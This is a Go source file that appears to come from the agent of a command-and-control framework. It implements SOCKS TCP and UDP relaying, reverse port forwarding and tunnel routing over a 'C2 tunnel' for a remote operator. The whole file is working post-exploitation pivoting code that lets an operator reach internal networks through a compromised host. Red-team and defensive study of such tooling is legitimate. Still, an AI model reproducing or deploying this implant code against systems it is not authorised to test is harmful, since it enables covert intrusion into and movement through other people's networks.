//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

func socksProcessFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "connect":
			go socksHandleConnect(f.ConnID, string(f.Data))
		case "data":
			socksHandleData(f.ConnID, f.Data)
		case "close":
			socksHandleClose(f.ConnID)
		case "rportfwd_connect":
			go rportfwdDial(f.ConnID, string(f.Data))
		case "rportfwd_data":
			rportfwdWrite(f.ConnID, f.Data)
		case "rportfwd_close":
			rportfwdClose(f.ConnID)
		case "tunnel_add":
			tunnelAddRouteFromFrame(string(f.Data))
		case "tunnel_remove":
			tunnelRemoveRouteFromFrame(string(f.Data))

		// UDP ASSOCIATE
		case "udp_associate":
			go socksHandleUDPAssociate(f.ConnID)
		case "udp_data":
			socksHandleUDPData(f.ConnID, f.Data)
		}
	}
}

func socksHandleConnect(connID uint64, destAddr string) {
	conn, err := net.DialTimeout("tcp", destAddr, 10*time.Second)
	if err != nil {
		if Debug {
			fmt.Printf("[socks] connect %s failed: %v\n", destAddr, err)
		}
		// Send close to orphan buffer ? server will close operator TCP on receipt.
		// Always enqueue so operator connection doesn't hang.
		socksRelayMu.Lock()
		if len(socksOrphanOut) < socksOrphanMaxOut {
			socksOrphanOut = append(socksOrphanOut, socksFrame{ConnID: connID, Action: "close"})
		}
		socksRelayMu.Unlock()
		return
	}

	rc := &socksRelayConn{tcpConn: conn}
	socksRelayMu.Lock()
	socksRelayConns[connID] = rc
	socksRelayMu.Unlock()

	socksEnqueueOut(connID, "connected", nil)

	if Debug {
		fmt.Printf("[socks] connected to %s (conn %d)\n", destAddr, connID)
	}

	// Read from target ? buffer for server
	buf := make([]byte, 32*1024) // 32KB read chunks
	for {
		conn.SetReadDeadline(time.Now().Add(SocksReadTimeout))
		n, err := conn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			socksEnqueueOut(connID, "data", data)
		}
		if err != nil {
			break
		}
	}

	// Target disconnected
	socksRelayMu.Lock()
	if rc2, ok := socksRelayConns[connID]; ok {
		rc2.mu.Lock()
		rc2.closed = true
		rc2.mu.Unlock()
		delete(socksRelayConns, connID)
	}
	socksRelayMu.Unlock()
	socksEnqueueOut(connID, "close", nil)

	if Debug {
		fmt.Printf("[socks] target %s disconnected (conn %d)\n", destAddr, connID)
	}
}

func socksHandleData(connID uint64, data []byte) {
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	socksRelayMu.Unlock()
	if !ok || len(data) == 0 {
		return
	}
	conn.mu.Lock()
	defer conn.mu.Unlock()
	if conn.closed {
		return
	}
	conn.tcpConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.tcpConn.Write(data); err != nil {
		// Write failed: mark the relay closed and drop the underlying
		// connection so we don't silently lose data or leak the socket.
		conn.closed = true
		conn.tcpConn.Close()
		return
	}
	conn.tcpConn.SetWriteDeadline(time.Time{})
}

func socksHandleClose(connID uint64) {
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	if ok {
		delete(socksRelayConns, connID)
	}
	socksRelayMu.Unlock()
	if ok {
		conn.mu.Lock()
		conn.closed = true
		conn.tcpConn.Close()
		conn.mu.Unlock()
	}

	// Also clean up UDP associations with the same ConnID
	udpRelayMu.Lock()
	uc, uok := udpRelayConns[connID]
	if uok {
		delete(udpRelayConns, connID)
	}
	udpRelayMu.Unlock()
	if uok {
		uc.mu.Lock()
		uc.closed = true
		uc.mu.Unlock()
		uc.udpConn.Close()
	}
}

// socksHandleUDPAssociate starts a local UDP listener on the agent for
// relaying UDP datagrams through the C2 tunnel for the given association.
func socksHandleUDPAssociate(connID uint64) {
	udpConn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	if err != nil {
		if Debug {
			fmt.Printf("[socks] UDP ASSOCIATE listen failed: %v\n", err)
		}
		return
	}

	uc := &udpRelayConn{
		connID:  connID,
		udpConn: udpConn,
	}

	udpRelayMu.Lock()
	udpRelayConns[connID] = uc
	udpRelayMu.Unlock()

	if Debug {
		fmt.Printf("[socks] UDP ASSOCIATE started on port %d (conn %d)\n",
			udpConn.LocalAddr().(*net.UDPAddr).Port, connID)
	}

	// Read goroutine: captures response datagrams from any target and
	// sends them back to the server via the C2 tunnel.
	buf := make([]byte, 65535)
	go func() {
		defer func() {
			udpRelayMu.Lock()
			if existing, ok := udpRelayConns[connID]; ok && existing == uc {
				delete(udpRelayConns, connID)
			}
			udpRelayMu.Unlock()
			udpConn.Close()
		}()

		for {
			n, srcAddr, err := udpConn.ReadFromUDP(buf)
			if err != nil {
				return
			}

			payload := make([]byte, n)
			copy(payload, buf[:n])

			// Encode source address + payload and enqueue for server
			encoded := encodeUDPFrameData(srcAddr.IP.String(), srcAddr.Port, payload)
			socksEnqueueOut(connID, "udp_data", encoded)
		}
	}()
}

// socksHandleUDPData sends a UDP datagram to the target address specified in
// the frame data. The response (if any) is captured by the read goroutine
// started in socksHandleUDPAssociate.
func socksHandleUDPData(connID uint64, data []byte) {
	udpRelayMu.Lock()
	uc, ok := udpRelayConns[connID]
	udpRelayMu.Unlock()
	if !ok || len(data) == 0 {
		return
	}

	dstAddr, dstPort, payload, err := decodeUDPFrameData(data)
	if err != nil {
		if Debug {
			fmt.Printf("[socks] UDP data decode error: %v\n", err)
		}
		return
	}

	dstUDPAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", dstAddr, dstPort))
	if err != nil {
		if Debug {
			fmt.Printf("[socks] UDP resolve %s:%d failed: %v\n", dstAddr, dstPort, err)
		}
		return
	}

	uc.mu.Lock()
	defer uc.mu.Unlock()
	if uc.closed {
		return
	}

	if _, err := uc.udpConn.WriteTo(payload, dstUDPAddr); err != nil {
		if Debug {
			fmt.Printf("[socks] UDP write to %s:%d failed: %v\n", dstAddr, dstPort, err)
		}
	}
}

// ── UDP Frame Binary Encoding ───────────────────────────────────────────────

// encodeUDPFrameData encodes (addr, port, payload) into a binary blob for
// SocksFrame.Data. Format: addrLen(2) + addr(N) + port(2) + payload.
func encodeUDPFrameData(addr string, port int, payload []byte) []byte {
	addrBytes := []byte(addr)
	out := make([]byte, 2+len(addrBytes)+2+len(payload))
	binary.BigEndian.PutUint16(out[0:2], uint16(len(addrBytes)))
	copy(out[2:], addrBytes)
	binary.BigEndian.PutUint16(out[2+len(addrBytes):], uint16(port))
	copy(out[4+len(addrBytes):], payload)
	return out
}

// decodeUDPFrameData reverses encodeUDPFrameData.
func decodeUDPFrameData(data []byte) (addr string, port int, payload []byte, err error) {
	if len(data) < 4 {
		return "", 0, nil, fmt.Errorf("UDP frame data too short: %d bytes", len(data))
	}
	addrLen := int(binary.BigEndian.Uint16(data[0:2]))
	if len(data) < 2+addrLen+2 {
		return "", 0, nil, fmt.Errorf("UDP frame data truncated: need %d, have %d", 2+addrLen+2, len(data))
	}
	addr = string(data[2 : 2+addrLen])
	port = int(binary.BigEndian.Uint16(data[2+addrLen : 4+addrLen]))
	payload = data[4+addrLen:]
	return
}

func socksEnqueueOut(connID uint64, action string, data []byte) {
	frame := socksFrame{ConnID: connID, Action: action, Data: data}

	// Check TCP connections first
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	socksRelayMu.Unlock()

	if ok {
		conn.mu.Lock()
		// Bound the per-connection outbound queue so a faster local client cannot
		// grow agent memory without limit while the C2 link is slow.
		if len(conn.outbound) >= socksMaxConnOut {
			conn.outbound = conn.outbound[1:]
		}
		conn.outbound = append(conn.outbound, frame)
		conn.mu.Unlock()
		return
	}

	// Check UDP associations for udp_data frames
	if action == "udp_data" {
		udpRelayMu.Lock()
		udpOrphanOut = append(udpOrphanOut, frame)
		if len(udpOrphanOut) > socksOrphanMaxOut {
			udpOrphanOut = udpOrphanOut[1:]
		}
		udpRelayMu.Unlock()
		return
	}

	// Connection not in map ? control frames (close/connected) go to orphan buffer
	if action != "close" && action != "connected" {
		return // drop data frames for unknown connections
	}
	socksRelayMu.Lock()
	if len(socksOrphanOut) >= socksOrphanMaxOut {
		// Drop oldest to prevent unbounded growth
		socksOrphanOut = socksOrphanOut[1:]
	}
	socksOrphanOut = append(socksOrphanOut, frame)
	socksRelayMu.Unlock()
}

// socksOrphanOut holds control frames for connections not in the map
var socksOrphanOut []socksFrame

// udpOrphanOut holds UDP data frames for UDP associations not tracked via TCP
var udpOrphanOut []socksFrame

func socksCollectOutbound() []socksFrame {
	var frames []socksFrame

	// Collect orphan frames (connected/close for non-tracked conns)
	socksRelayMu.Lock()
	if len(socksOrphanOut) > 0 {
		frames = append(frames, socksOrphanOut...)
		socksOrphanOut = socksOrphanOut[:0]
	}
	socksRelayMu.Unlock()

	// Collect UDP orphan frames (udp_data for UDP associations)
	udpRelayMu.Lock()
	if len(udpOrphanOut) > 0 {
		frames = append(frames, udpOrphanOut...)
		udpOrphanOut = udpOrphanOut[:0]
	}
	udpRelayMu.Unlock()

	// Collect from active connections (direct struct copy, no marshal/unmarshal)
	socksRelayMu.Lock()
	for _, conn := range socksRelayConns {
		conn.mu.Lock()
		if len(conn.outbound) > 0 {
			frames = append(frames, conn.outbound...)
			conn.outbound = conn.outbound[:0]
		}
		conn.mu.Unlock()
	}
	socksRelayMu.Unlock()

	return frames
}
